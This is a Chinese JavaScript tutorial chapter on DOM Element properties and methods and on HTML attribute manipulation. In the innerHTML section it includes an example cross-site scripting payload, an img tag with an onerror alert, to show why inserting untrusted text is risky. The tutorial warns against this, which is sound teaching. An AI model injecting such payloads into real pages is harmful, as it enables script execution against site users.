   上面代码中， ``<div>`` 元素有 ``contenteditable`` 属性，因此用户可以在网页上编辑这个区块的内容。

    ``Element.contentEditable`` 属性返回一个字符串，表示是否设置了 ``contenteditable`` 属性，有三种可能的值。该属性可写。

   -  ``"true"`` ：元素内容可编辑
   -  ``"false"`` ：元素内容不可编辑
   -  ``"inherit"`` ：元素是否可编辑，继承了父元素的设置

    ``Element.isContentEditable`` 属性返回一个布尔值，同样表示是否设置了 ``contenteditable`` 属性。该属性只读。

Element.attributes
~~~~~~~~~~~~~~~~~~~

    ``Element.attributes`` 属性返回一个类似数组的对象，成员是当前元素节点的所有属性节点，详见《属性的操作》一章。

   .. code:: javascript

      var p = document.querySelector('p');
      var attrs = p.attributes;
   
      for (var i = attrs.length - 1; i >= 0; i--) {
        console.log(attrs[i].name + '->' + attrs[i].value);
      }

   上面代码遍历 ``p`` 元素的所有属性。

Element.className，Element.classList
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``className`` 属性用来读写当前元素节点的 ``class`` 属性。它的值是一个字符串，每个 ``class`` 之间用空格分割。

    ``classList`` 属性返回一个类似数组的对象，当前元素节点的每个 ``class`` 就是这个对象的一个成员。

   .. code:: javascript

      // HTML 代码 <div class="one two three" id="myDiv"></div>
      var div = document.getElementById('myDiv');
   
      div.className
      // "one two three"
   
      div.classList
      // {
      //   0: "one"
      //   1: "two"
      //   2: "three"
      //   length: 3
      // }

   上面代码中， ``className`` 属性返回一个空格分隔的字符串，而 ``classList`` 属性指向一个类似数组的对象，该对象的 ``length`` 属性（只读）返回当前元素的 ``class`` 数量。

    ``classList`` 对象有下列方法。

   -  ``add()`` ：增加一个 class。
   -  ``remove()`` ：移除一个 class。
   -  ``contains()`` ：检查当前元素是否包含某个 class。
   -  ``toggle()`` ：将某个 class 移入或移出当前元素。
   -  ``item()`` ：返回指定索引位置的 class。
   -  ``toString()`` ：将 class 的列表转为字符串。

   .. code:: javascript

      var div = document.getElementById('myDiv');
   
      div.classList.add('myCssClass');
      div.classList.add('foo', 'bar');
      div.classList.remove('myCssClass');
      div.classList.toggle('myCssClass'); // 如果 myCssClass 不存在就加入，否则移除
      div.classList.contains('myCssClass'); // 返回 true 或者 false
      div.classList.item(0); // 返回第一个 Class
      div.classList.toString();

   下面比较一下， ``className`` 和 ``classList`` 在添加和删除某个 class 时的写法。

   .. code:: javascript

      var foo = document.getElementById('foo');
   
      // 添加class
      foo.className += 'bold';
      foo.classList.add('bold');
   
      // 删除class
      foo.classList.remove('bold');
      foo.className = foo.className.replace(/^bold$/, '');

    ``toggle`` 方法可以接受一个布尔值，作为第二个参数。如果为 ``true`` ，则添加该属性；如果为 ``false`` ，则去除该属性。

   .. code:: javascript

      el.classList.toggle('abc', boolValue);
   
      // 等同于
      if (boolValue) {
        el.classList.add('abc');
      } else {
        el.classList.remove('abc');
      }

Element.dataset
~~~~~~~~~~~~~~~~

   网页元素可以自定义 ``data-`` 属性，用来添加数据。

   .. code:: html

      <div data-timestamp="1522907809292"></div>

   上面代码中， ``<div>`` 元素有一个自定义的 ``data-timestamp`` 属性，用来为该元素添加一个时间戳。

    ``Element.dataset`` 属性返回一个对象，可以从这个对象读写 ``data-`` 属性。

   .. code:: javascript

      // <article
      //   id="foo"
      //   data-columns="3"
      //   data-index-number="12314"
      //   data-parent="cars">
      //   ...
      // </article>
      var article = document.getElementById('foo');
      article.dataset.columns // "3"
      article.dataset.indexNumber // "12314"
      article.dataset.parent // "cars"

   注意， ``dataset`` 上面的各个属性返回都是字符串。

   HTML 代码中， ``data-`` 属性的属性名，只能包含英文字母、数字、连词线（ ``-`` ）、点（ ``.`` ）、冒号（ ``:`` ）和下划线（ ``_`` ）。它们转成 JavaScript 对应的 ``dataset`` 属性名，规则如下。

   - 开头的 ``data-`` 会省略。
   - 如果连词线后面跟了一个英文字母，那么连词线会取消，该字母变成大写。
   - 其他字符不变。

   因此， ``data-abc-def`` 对应 ``dataset.abcDef`` ， ``data-abc-1`` 对应 ``dataset["abc-1"]`` 。

   除了使用 ``dataset`` 读写 ``data-`` 属性，也可以使用 ``Element.getAttribute()`` 和 ``Element.setAttribute()`` ，通过完整的属性名读写这些属性。

   .. code:: javascript

      var mydiv = document.getElementById('mydiv');
   
      mydiv.dataset.foo = 'bar';
      mydiv.getAttribute('data-foo') // "bar"

Element.innerHTML
~~~~~~~~~~~~~~~~~~

    ``Element.innerHTML`` 属性返回一个字符串，等同于该元素包含的所有 HTML 代码。该属性可读写，常用来设置某个节点的内容。它能改写所有元素节点的内容，包括 ``<HTML>`` 和 ``<body>`` 元素。

   如果将 ``innerHTML`` 属性设为空，等于删除所有它包含的所有节点。

   .. code:: javascript

      el.innerHTML = '';

   上面代码等于将 ``el`` 节点变成了一个空节点， ``el`` 原来包含的节点被全部删除。

   注意，读取属性值的时候，如果文本节点包含 ``&`` 、小于号（ ``<`` ）和大于号（ ``>`` ）， ``innerHTML`` 属性会将它们转为实体形式 ``&amp;`` 、 ``&lt;`` 、 ``&gt;`` 。如果想得到原文，建议使用 ``element.textContent`` 属性。

   .. code:: javascript

      // HTML代码如下 <p id="para"> 5 > 3 </p>
      document.getElementById('para').innerHTML
      // 5 &gt; 3

   写入的时候，如果插入的文本包含 HTML 标签，会被解析成为节点对象插入 DOM。注意，如果文本之中含有 ``<script>`` 标签，虽然可以生成 ``script`` 节点，但是插入的代码不会执行。

   .. code:: javascript

      var name = "<script>alert('haha')</script>";
      el.innerHTML = name;

   上面代码将脚本插入内容，脚本并不会执行。但是， ``innerHTML`` 还是有安全风险的。

   .. code:: javascript

      var name = "<img src=x onerror=alert(1)>";
      el.innerHTML = name;

   上面代码中， ``alert`` 方法是会执行的。因此为了安全考虑，如果插入的是文本，最好用 ``textContent`` 属性代替 ``innerHTML`` 。

Element.outerHTML
~~~~~~~~~~~~~~~~~~

    ``Element.outerHTML`` 属性返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素。

   .. code:: javascript

      // HTML 代码如下
      // <div id="d"><p>Hello</p></div>
      var d = document.getElementById('d');
      d.outerHTML
      // '<div id="d"><p>Hello</p></div>'

    ``outerHTML`` 属性是可读写的，对它进行赋值，等于替换掉当前元素。

   .. code:: javascript

      // HTML 代码如下
      // <div id="container"><div id="d">Hello</div></div>
      var container = document.getElementById('container');
      var d = document.getElementById('d');
      container.firstChild.nodeName // "DIV"
      d.nodeName // "DIV"
   
      d.outerHTML = '<p>Hello</p>';
      container.firstChild.nodeName // "P"
      d.nodeName // "DIV"

   上面代码中，变量 ``d`` 代表子节点，它的 ``outerHTML`` 属性重新赋值以后，内层的 ``div`` 元素就不存在了，被 ``p`` 元素替换了。但是，变量 ``d`` 依然指向原来的 ``div`` 元素，这表示被替换的 ``DIV`` 元素还存在于内存中。

   注意，如果一个节点没有父节点，设置 ``outerHTML`` 属性会报错。

   .. code:: javascript

      var div = document.createElement('div');
      div.outerHTML = '<p>test</p>';
      // DOMException: This element has no parent node.

   上面代码中， ``div`` 元素没有父节点，设置 ``outerHTML`` 属性会报错。

Element.clientHeight，Element.clientWidth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.clientHeight`` 属性返回一个整数值，表示元素节点的 CSS 高度（单位像素），只对块级元素生效，对于行内元素返回 ``0`` 。如果块级元素没有设置 CSS 高度，则返回实际高度。

   除了元素本身的高度，它还包括 ``padding`` 部分，但是不包括 ``border`` 、 ``margin`` 。如果有水平滚动条，还要减去水平滚动条的高度。注意，这个值始终是整数，如果是小数会被四舍五入。

    ``Element.clientWidth`` 属性返回元素节点的 CSS 宽度，同样只对块级元素有效，也是只包括元素本身的宽度和 ``padding`` ，如果有垂直滚动条，还要减去垂直滚动条的宽度。

    ``document.documentElement`` 的 ``clientHeight`` 属性，返回当前视口的高度（即浏览器窗口的高度），等同于 ``window.innerHeight`` 属性减去水平滚动条的高度（如果有的话）。 ``document.body`` 的高度则是网页的实际高度。一般来说， ``document.body.clientHeight`` 大于 ``document.documentElement.clientHeight`` 。

   .. code:: javascript

      // 视口高度
      document.documentElement.clientHeight
   
      // 网页总高度
      document.body.clientHeight

Element.clientLeft，Element.clientTop
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.clientLeft`` 属性等于元素节点左边框（left border）的宽度（单位像素），不包括左侧的 ``padding`` 和 ``margin`` 。如果没有设置左边框，或者是行内元素（ ``display: inline`` ），该属性返回 ``0`` 。该属性总是返回整数值，如果是小数，会四舍五入。

    ``Element.clientTop`` 属性等于网页元素顶部边框的宽度（单位像素），其他特点都与 ``clientLeft`` 相同。

Element.scrollHeight，Element.scrollWidth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.scrollHeight`` 属性返回一个整数值（小数会四舍五入），表示当前元素的总高度（单位像素），包括溢出容器、当前不可见的部分。它包括 ``padding`` ，但是不包括 ``border`` 、 ``margin`` 以及水平滚动条的高度（如果有水平滚动条的话），还包括伪元素（ ``::before`` 或 ``::after`` ）的高度。

    ``Element.scrollWidth`` 属性表示当前元素的总宽度（单位像素），其他地方都与 ``scrollHeight`` 属性类似。这两个属性只读。

   整张网页的总高度可以从 ``document.documentElement`` 或 ``document.body`` 上读取。

   .. code:: javascript

      // 返回网页的总高度
      document.documentElement.scrollHeight
      document.body.scrollHeight

   注意，如果元素节点的内容出现溢出，即使溢出的内容是隐藏的， ``scrollHeight`` 属性仍然返回元素的总高度。

   .. code:: javascript

      // HTML 代码如下
      // <div id="myDiv" style="height: 200px; overflow: hidden;">...</div>
      document.getElementById('myDiv').scrollHeight // 200

   上面代码中，即使 ``myDiv`` 元素的 CSS 高度只有200像素，且溢出部分不可见，但是 ``scrollHeight`` 仍然会返回该元素的原始高度。

Element.scrollLeft，Element.scrollTop
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.scrollLeft`` 属性表示当前元素的水平滚动条向右侧滚动的像素数量， ``Element.scrollTop`` 属性表示当前元素的垂直滚动条向下滚动的像素数量。对于那些没有滚动条的网页元素，这两个属性总是等于0。

   如果要查看整张网页的水平的和垂直的滚动距离，要从 ``document.documentElement`` 元素上读取。

   .. code:: javascript

      document.documentElement.scrollLeft
      document.documentElement.scrollTop

   这两个属性都可读写，设置该属性的值，会导致浏览器将当前元素自动滚动到相应的位置。

Element.offsetParent
~~~~~~~~~~~~~~~~~~~~~

    ``Element.offsetParent`` 属性返回最靠近当前元素的、并且 CSS 的 ``position`` 属性不等于 ``static`` 的上层元素。

   .. code:: html

      <div style="position: absolute;">
        <p>
          <span>Hello</span>
        </p>
      </div>

   上面代码中， ``span`` 元素的 ``offsetParent`` 属性就是 ``div`` 元素。

   该属性主要用于确定子元素位置偏移的计算基准， ``Element.offsetTop`` 和 ``Element.offsetLeft`` 就是 ``offsetParent`` 元素计算的。

   如果该元素是不可见的（ ``display`` 属性为 ``none`` ），或者位置是固定的（ ``position`` 属性为 ``fixed`` ），则 ``offsetParent`` 属性返回 ``null`` 。

   .. code:: html

      <div style="position: absolute;">
        <p>
          <span style="display: none;">Hello</span>
        </p>
      </div>

   上面代码中， ``span`` 元素的 ``offsetParent`` 属性是 ``null`` 。

   如果某个元素的所有上层节点的 ``position`` 属性都是 ``static`` ，则 ``Element.offsetParent`` 属性指向 ``<body>`` 元素。

Element.offsetHeight，Element.offsetWidth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.offsetHeight`` 属性返回一个整数，表示元素的 CSS 垂直高度（单位像素），包括元素本身的高度、padding 和 border，以及水平滚动条的高度（如果存在滚动条）。

    ``Element.offsetWidth`` 属性表示元素的 CSS 水平宽度（单位像素），其他都与 ``Element.offsetHeight`` 一致。

   这两个属性都是只读属性，只比 ``Element.clientHeight`` 和 ``Element.clientWidth`` 多了边框的高度或宽度。如果元素的 CSS 设为不可见（比如 ``display: none;`` ），则返回 ``0`` 。

Element.offsetLeft，Element.offsetTop
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.offsetLeft`` 返回当前元素左上角相对于 ``Element.offsetParent`` 节点的水平位移， ``Element.offsetTop`` 返回垂直位移，单位为像素。通常，这两个值是指相对于父节点的位移。

   下面的代码可以算出元素左上角相对于整张网页的坐标。

   .. code:: javascript

      function getElementPosition(e) {
        var x = 0;
        var y = 0;
        while (e !== null)  {
          x += e.offsetLeft;
          y += e.offsetTop;
          e = e.offsetParent;
        }
        return {x: x, y: y};
      }

Element.style
~~~~~~~~~~~~~~

   每个元素节点都有 ``style`` 用来读写该元素的行内样式信息，具体介绍参见《CSS 操作》一章。

Element.children，Element.childElementCount
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.children`` 属性返回一个类似数组的对象（ ``HTMLCollection`` 实例），包括当前元素节点的所有子元素。如果当前元素没有子元素，则返回的对象包含零个成员。

   .. code:: javascript

      if (para.children.length) {
        var children = para.children;
          for (var i = 0; i < children.length; i++) {
            // ...
          }
      }

   上面代码遍历了 ``para`` 元素的所有子元素。

   这个属性与 ``Node.childNodes`` 属性的区别是，它只包括元素类型的子节点，不包括其他类型的子节点。

    ``Element.childElementCount`` 属性返回当前元素节点包含的子元素节点的个数，与 ``Element.children.length`` 的值相同。

Element.firstElementChild，Element.lastElementChild
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.firstElementChild`` 属性返回当前元素的第一个元素子节点， ``Element.lastElementChild`` 返回最后一个元素子节点。

   如果没有元素子节点，这两个属性返回 ``null`` 。

Element.nextElementSibling，Element.previousElementSibling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.nextElementSibling`` 属性返回当前元素节点的后一个同级元素节点，如果没有则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <div id="div-01">Here is div-01</div>
      // <div id="div-02">Here is div-02</div>
      var el = document.getElementById('div-01');
      el.nextElementSibling
      // <div id="div-02">Here is div-02</div>

    ``Element.previousElementSibling`` 属性返回当前元素节点的前一个同级元素节点，如果没有则返回 ``null`` 。

实例方法
-------


属性相关方法
~~~~~~~~~~

   元素节点提供六个方法，用来操作属性。

   -  ``getAttribute()`` ：读取某个属性的值
   -  ``getAttributeNames()`` ：返回当前元素的所有属性名
   -  ``setAttribute()`` ：写入属性值
   -  ``hasAttribute()`` ：某个属性是否存在
   -  ``hasAttributes()`` ：当前元素是否有属性
   -  ``removeAttribute()`` ：删除属性

   这些方法的介绍请看《属性的操作》一章。

Element.querySelector()
~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.querySelector`` 方法接受 CSS 选择器作为参数，返回父元素的第一个匹配的子元素。如果没有找到匹配的子元素，就返回 ``null`` 。

   .. code:: javascript

      var content = document.getElementById('content');
      var el = content.querySelector('p');

   上面代码返回 ``content`` 节点的第一个 ``p`` 元素。

    ``Element.querySelector`` 方法可以接受任何复杂的 CSS 选择器。

   .. code:: javascript

      document.body.querySelector("style[type='text/css'], style:not([type])");

   注意，这个方法无法选中伪元素。

   它可以接受多个选择器，它们之间使用逗号分隔。

   .. code:: javascript

      element.querySelector('div, p')

   上面代码返回 ``element`` 的第一个 ``div`` 或 ``p`` 子元素。

   需要注意的是，浏览器执行 ``querySelector`` 方法时，是先在全局范围内搜索给定的 CSS 选择器，然后过滤出哪些属于当前元素的子元素。因此，会有一些违反直觉的结果，下面是一段 HTML 代码。

   .. code:: html

      <div>
      <blockquote id="outer">
        <p>Hello</p>
        <div id="inner">
          <p>World</p>
        </div>
      </blockquote>
      </div>

   那么，像下面这样查询的话，实际上返回的是第一个 ``p`` 元素，而不是第二个。

   .. code:: javascript

      var outer = document.getElementById('outer');
      outer.querySelector('div p')
      // <p>Hello</p>

Element.querySelectorAll()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.querySelectorAll`` 方法接受 CSS 选择器作为参数，返回一个 ``NodeList`` 实例，包含所有匹配的子元素。

   .. code:: javascript

      var el = document.querySelector('#test');
      var matches = el.querySelectorAll('div.highlighted > p');

   该方法的执行机制与 ``querySelector`` 方法相同，也是先在全局范围内查找，再过滤出当前元素的子元素。因此，选择器实际上针对整个文档的。

   它也可以接受多个 CSS 选择器，它们之间使用逗号分隔。如果选择器里面有伪元素的选择器，则总是返回一个空的 ``NodeList`` 实例。

Element.getElementsByClassName()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getElementsByClassName`` 方法返回一个 ``HTMLCollection`` 实例，成员是当前元素节点的所有具有指定 class 的子元素节点。该方法与 ``document.getElementsByClassName`` 方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。

   .. code:: javascript

      element.getElementsByClassName('red test');

   注意，该方法的参数大小写敏感。

   由于 ``HTMLCollection`` 实例是一个活的集合， ``document`` 对象的任何变化会立刻反应到实例，下面的代码不会生效。

   .. code:: javascript

      // HTML 代码如下
      // <div id="example">
      //   <p class="foo"></p>
      //   <p class="foo"></p>
      // </div>
      var element = document.getElementById('example');
      var matches = element.getElementsByClassName('foo');
   
      for (var i = 0; i< matches.length; i++) {
        matches[i].classList.remove('foo');
        matches.item(i).classList.add('bar');
      }
      // 执行后，HTML 代码如下
      // <div id="example">
      //   <p></p>
      //   <p class="foo bar"></p>
      // </div>

   上面代码中， ``matches`` 集合的第一个成员，一旦被拿掉 class 里面的 ``foo`` ，就会立刻从 ``matches`` 里面消失，导致出现上面的结果。

Element.getElementsByTagName()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getElementsByTagName()`` 方法返回一个 ``HTMLCollection`` 实例，成员是当前节点的所有匹配指定标签名的子元素节点。该方法与 ``document.getElementsByClassName()`` 方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。

   .. code:: javascript

      var table = document.getElementById('forecast-table');
      var cells = table.getElementsByTagName('td');

   注意，该方法的参数是大小写不敏感的，因为 HTML 标签名也是大小写不敏感。

Element.closest()
~~~~~~~~~~~~~~~~~~

    ``Element.closest`` 方法接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近当前节点的一个祖先节点（包括当前节点本身）。如果没有任何节点匹配 CSS 选择器，则返回 ``null`` 。

   .. code:: javascript

      // HTML 代码如下
      // <article>
      //   <div id="div-01">Here is div-01
      //     <div id="div-02">Here is div-02
      //       <div id="div-03">Here is div-03</div>
      //     </div>
      //   </div>
      // </article>
   
      var div03 = document.getElementById('div-03');
   
      // div-03 最近的祖先节点
      div03.closest("#div-02") // div-02
      div03.closest("div div") // div-03
      div03.closest("article > div") //div-01
      div03.closest(":not(div)") // article

   上面代码中，由于 ``closest`` 方法将当前节点也考虑在内，所以第二个 ``closest`` 方法返回 ``div-03`` 。

Element.matches()
~~~~~~~~~~~~~~~~~~

    ``Element.matches`` 方法返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器。

   .. code:: javascript

      if (el.matches('.someClass')) {
        console.log('Match!');
      }

事件相关方法
~~~~~~~~~~

   以下三个方法与 ``Element`` 节点的事件相关。这些方法都继承自 ``EventTarget`` 接口，详见相关章节。

   -  ``Element.addEventListener()`` ：添加事件的回调函数
   -  ``Element.removeEventListener()`` ：移除事件监听函数
   -  ``Element.dispatchEvent()`` ：触发事件

   .. code:: javascript

      element.addEventListener('click', listener, false);
      element.removeEventListener('click', listener, false);
   
      var event = new Event('click');
      element.dispatchEvent(event);

Element.scrollIntoView()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.scrollIntoView`` 方法滚动当前元素，进入浏览器的可见区域，类似于设置 ``window.location.hash`` 的效果。

   .. code:: javascript

      el.scrollIntoView(); // 等同于el.scrollIntoView(true)
      el.scrollIntoView(false);

   该方法可以接受一个布尔值作为参数。如果为 ``true`` ，表示元素的顶部与当前区域的可见部分的顶部对齐（前提是当前区域可滚动）；如果为 ``false`` ，表示元素的底部与当前区域的可见部分的尾部对齐（前提是当前区域可滚动）。如果没有提供该参数，默认为 ``true`` 。

Element.getBoundingClientRect()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getBoundingClientRect`` 方法返回一个对象，提供当前元素节点的大小、位置等信息，基本上就是 CSS 盒状模型的所有信息。

   .. code:: javascript

      var rect = obj.getBoundingClientRect();

   上面代码中， ``getBoundingClientRect`` 方法返回的 ``rect`` 对象，具有以下属性（全部为只读）。

   -  ``x`` ：元素左上角相对于视口的横坐标
   -  ``y`` ：元素左上角相对于视口的纵坐标
   -  ``height`` ：元素高度
   -  ``width`` ：元素宽度
   -  ``left`` ：元素左上角相对于视口的横坐标，与 ``x`` 属性相等
   -  ``right`` ：元素右边界相对于视口的横坐标（等于 ``x + width`` ）
   -  ``top`` ：元素顶部相对于视口的纵坐标，与 ``y`` 属性相等
   -  ``bottom`` ：元素底部相对于视口的纵坐标（等于 ``y + height`` ）

   由于元素相对于视口（viewport）的位置，会随着页面滚动变化，因此表示位置的四个属性值，都不是固定不变的。如果想得到绝对位置，可以将 ``left`` 属性加上 ``window.scrollX`` ， ``top`` 属性加上 ``window.scrollY`` 。

   注意， ``getBoundingClientRect`` 方法的所有属性，都把边框（ ``border`` 属性）算作元素的一部分。也就是说，都是从边框外缘的各个点来计算。因此， ``width`` 和 ``height`` 包括了元素本身 +  ``padding``  +  ``border`` 。

   另外，上面的这些属性，都是继承自原型的属性， ``Object.keys`` 会返回一个空数组，这一点也需要注意。

   .. code:: javascript

      var rect = document.body.getBoundingClientRect();
      Object.keys(rect) // []

   上面代码中， ``rect`` 对象没有自身属性，而 ``Object.keys`` 方法只返回对象自身的属性，所以返回了一个空数组。

Element.getClientRects()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.getClientRects`` 方法返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形（所以方法名中的 ``Rect`` 用的是复数）。每个矩形都有 ``bottom`` 、 ``height`` 、 ``left`` 、 ``right`` 、 ``top`` 和 ``width`` 六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。

   对于盒状元素（比如 ``<div>`` 和 ``<p>`` ），该方法返回的对象中只有该元素一个成员。对于行内元素（比如 ``<span>`` 、 ``<a>`` 、 ``<em>`` ），该方法返回的对象有多少个成员，取决于该元素在页面上占据多少行。这是它和 ``Element.getBoundingClientRect()`` 方法的主要区别，后者对于行内元素总是返回一个矩形。

   .. code:: html

      <span id="inline">Hello World Hello World Hello World</span>

   上面代码是一个行内元素 ``<span>`` ，如果它在页面上占据三行， ``getClientRects`` 方法返回的对象就有三个成员，如果它在页面上占据一行， ``getClientRects`` 方法返回的对象就只有一个成员。

   .. code:: javascript

      var el = document.getElementById('inline');
      el.getClientRects().length // 3
      el.getClientRects()[0].left // 8
      el.getClientRects()[0].right // 113.908203125
      el.getClientRects()[0].bottom // 31.200000762939453
      el.getClientRects()[0].height // 23.200000762939453
      el.getClientRects()[0].width // 105.908203125

   这个方法主要用于判断行内元素是否换行，以及行内元素的每一行的位置偏移。

   注意，如果行内元素包括换行符，那么该方法会把换行符考虑在内。

   .. code:: html

      <span id="inline">
        Hello World
        Hello World
        Hello World
      </span>

   上面代码中， ``<span>`` 节点内部有三个换行符，即使 HTML 语言忽略换行符，将它们显示为一行， ``getClientRects()`` 方法依然会返回三个成员。如果行宽设置得特别窄，上面的 ``<span>`` 元素显示为6行，那么就会返回六个成员。

Element.insertAdjacentElement()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.insertAdjacentElement`` 方法在相对于当前元素的指定位置，插入一个新的节点。该方法返回被插入的节点，如果插入失败，返回 ``null`` 。

   .. code:: javascript

      element.insertAdjacentElement(position, element);

    ``Element.insertAdjacentElement`` 方法一共可以接受两个参数，第一个参数是一个字符串，表示插入的位置，第二个参数是将要插入的节点。第一个参数只可以取如下的值。

   -  ``beforebegin`` ：当前元素之前
   -  ``afterbegin`` ：当前元素内部的第一个子节点前面
   -  ``beforeend`` ：当前元素内部的最后一个子节点后面
   -  ``afterend`` ：当前元素之后

   注意， ``beforebegin`` 和 ``afterend`` 这两个值，只在当前节点有父节点时才会生效。如果当前节点是由脚本创建的，没有父节点，那么插入会失败。

   .. code:: javascript

      var p1 = document.createElement('p')
      var p2 = document.createElement('p')
      p1.insertAdjacentElement('afterend', p2) // null

   上面代码中， ``p1`` 没有父节点，所以插入 ``p2`` 到它后面就失败了。

   如果插入的节点是一个文档里现有的节点，它会从原有位置删除，放置到新的位置。

Element.insertAdjacentHTML()，Element.insertAdjacentText()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.insertAdjacentHTML`` 方法用于将一个 HTML 字符串，解析生成 DOM 结构，插入相对于当前节点的指定位置。

   .. code:: javascript

      element.insertAdjacentHTML(position, text);

   该方法接受两个参数，第一个是一个表示指定位置的字符串，第二个是待解析的 HTML 字符串。第一个参数只能设置下面四个值之一。

   -  ``beforebegin`` ：当前元素之前
   -  ``afterbegin`` ：当前元素内部的第一个子节点前面
   -  ``beforeend`` ：当前元素内部的最后一个子节点后面
   -  ``afterend`` ：当前元素之后

   .. code:: javascript

      // HTML 代码：<div id="one">one</div>
      var d1 = document.getElementById('one');
      d1.insertAdjacentHTML('afterend', '<div id="two">two</div>');
      // 执行后的 HTML 代码：
      // <div id="one">one</div><div id="two">two</div>

   该方法只是在现有的 DOM 结构里面插入节点，这使得它的执行速度比 ``innerHTML`` 方法快得多。

   注意，该方法不会转义 HTML 字符串，这导致它不能用来插入用户输入的内容，否则会有安全风险。

    ``Element.insertAdjacentText`` 方法在相对于当前节点的指定位置，插入一个文本节点，用法与 ``Element.insertAdjacentHTML`` 方法完全一致。

   .. code:: javascript

      // HTML 代码：<div id="one">one</div>
      var d1 = document.getElementById('one');
      d1.insertAdjacentText('afterend', 'two');
      // 执行后的 HTML 代码：
      // <div id="one">one</div>two

Element.remove()
~~~~~~~~~~~~~~~~~

    ``Element.remove`` 方法继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。

   .. code:: javascript

      var el = document.getElementById('mydiv');
      el.remove();

   上面代码将 ``el`` 节点从 DOM 树里面移除。

Element.focus()，Element.blur()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``Element.focus`` 方法用于将当前页面的焦点，转移到指定元素上。

   .. code:: javascript

      document.getElementById('my-span').focus();

   该方法可以接受一个对象作为参数。参数对象的 ``preventScroll`` 属性是一个布尔值，指定是否将当前元素停留在原始位置，而不是滚动到可见区域。

   .. code:: javascript

      function getFocus() {
        document.getElementById('btn').focus({preventScroll:false});
      }

   上面代码会让 ``btn`` 元素获得焦点，并滚动到可见区域。

   最后，从 ``document.activeElement`` 属性可以得到当前获得焦点的元素。

    ``Element.blur`` 方法用于将焦点从当前元素移除。

Element.click()
~~~~~~~~~~~~~~~~

    ``Element.click`` 方法用于在当前元素上模拟一次鼠标点击，相当于触发了 ``click`` 事件。

参考链接
-------

   - Craig Buckler，[How to Translate from DOM to SVG Coordinates and Back Again](https://www.sitepoint.com/how-to-translate-from-dom-to-svg-coordinates-and-back-again/)

/🟠 属性的操作
=============

   HTML 元素包括标签名和若干个键值对，这个键值对就称为“属性”（attribute）。

   .. code:: html

      <a id="test" href="http://www.example.com">
        链接
      </a>

   上面代码中， ``a`` 元素包括两个属性： ``id`` 属性和 ``href`` 属性。

   属性本身是一个对象（ ``Attr`` 对象），但是实际上，这个对象极少使用。一般都是通过元素节点对象（ ``HTMlElement`` 对象）来操作属性。本章介绍如何操作这些属性。

Element.attributes 属性
-----------------------

   元素对象有一个 ``attributes`` 属性，返回一个类似数组的动态对象，成员是该元素标签的所有属性节点对象，属性的实时变化都会反映在这个节点对象上。其他类型的节点对象，虽然也有 ``attributes`` 属性，但返回的都是 ``null`` ，因此可以把这个属性视为元素对象独有的。

   单个属性可以通过序号引用，也可以通过属性名引用。

   .. code:: javascript

      // HTML 代码如下
      // <body bgcolor="yellow" onload="">
      document.body.attributes[0]
      document.body.attributes.bgcolor
      document.body.attributes['ONLOAD']

   注意，上面代码的三种方法，返回的都是属性节点对象，而不是属性值。

   属性节点对象有 ``name`` 和 ``value`` 属性，对应该属性的属性名和属性值，等同于 ``nodeName`` 属性和 ``nodeValue`` 属性。

   .. code:: javascript

      // HTML代码为
      // <div id="mydiv">
      var n = document.getElementById('mydiv');
   
      n.attributes[0].name // "id"
      n.attributes[0].nodeName // "id"
   
      n.attributes[0].value // "mydiv"
      n.attributes[0].nodeValue // "mydiv"

   下面代码可以遍历一个元素节点的所有属性。

   .. code:: javascript

      var para = document.getElementsByTagName('p')[0];
      var result = document.getElementById('result');
   
      if (para.hasAttributes()) {
        var attrs = para.attributes;
        var output = '';
        for(var i = attrs.length - 1; i >= 0; i--) {
          output += attrs[i].name + '->' + attrs[i].value;
        }
        result.textContent = output;
      } else {
        result.textContent = 'No attributes to show';
      }

元素的标准属性
------------

   HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性。

   .. code:: javascript

      var a = document.getElementById('test');
      a.id // "test"
      a.href // "http://www.example.com/"

   上面代码中， ``a`` 元素标签的属性 ``id`` 和 ``href`` ，自动成为节点对象的属性。

   这些属性都是可写的。

   .. code:: javascript

      var img = document.getElementById('myImage');
      img.src = 'http://www.example.com/image.jpg';

   上面的写法，会立刻替换掉 ``img`` 对象的 ``src`` 属性，即会显示另外一张图片。

   这种修改属性的方法，常常用于添加表单的属性。

   .. code:: javascript

      var f = document.forms[0];
      f.action = 'submit.php';
      f.method = 'POST';

   上面代码为表单添加提交网址和提交方法。

